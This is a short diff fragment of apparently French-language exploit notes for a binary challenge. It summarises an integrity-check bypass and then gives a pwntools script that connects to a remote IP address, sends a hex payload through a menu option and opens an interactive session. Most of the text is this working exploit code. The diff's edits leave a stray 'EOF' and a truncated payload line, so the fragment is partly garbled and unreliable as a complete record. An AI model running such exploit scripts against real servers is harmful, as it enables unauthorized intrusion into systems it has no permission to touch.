@@ -652,7 +652,6 @@ Je vois le serveur tourne bien. Laisse-moi analyser complètement le binaire et 
 | Bypass | Integrity check = djb2 → Collatz(64) → XOR table → pad avec `PUSH 0xd1bef; POP` |
 
 ---
-python3 - << 'EXPLOIT'
 from pwn import *
 
 HOST = '206.81.0.45'
@@ -662,13 +661,11 @@ PAYLOAD_HEX = "0c48000000000000000c31000000000000000cf6000000000000000c480000000
 
 io = remote(HOST, PORT)
 io.recvuntil(b'> ', timeout=10)
-
 io.sendline(b'1')
 io.recvuntil(b'): \n', timeout=5)
 io.sendline(PAYLOAD_HEX.encode())
 resp = io.recvuntil(b'> ', timeout=5)
 print(resp.decode(errors='replace'))
-
 io.sendline(b'2')
 io.interactive()
-EXPLOIT
+EOF
